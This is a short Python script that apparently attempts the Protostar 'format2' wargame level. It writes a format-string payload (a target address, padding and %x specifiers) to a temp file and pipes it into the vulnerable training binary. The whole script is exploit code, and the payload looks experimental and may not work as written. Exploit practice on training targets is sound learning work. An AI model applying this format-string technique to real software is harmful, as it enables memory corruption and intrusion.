
import os
import struct

def format(msg):
	return (msg+"R")[500:]



sploit="\xe4\x96\x04\x08AAAACCCC%i"+"\x90"*(1)+"%x "*(3) + "%x" + "\n"

#print format(sploit)
with open("/tmp/sploit_format2", "wb") as f:
	f.write(sploit)
os.system("/opt/protostar/bin/format2 < /tmp/sploit_format2")

#os.remove("/tmp/sploit_format2")
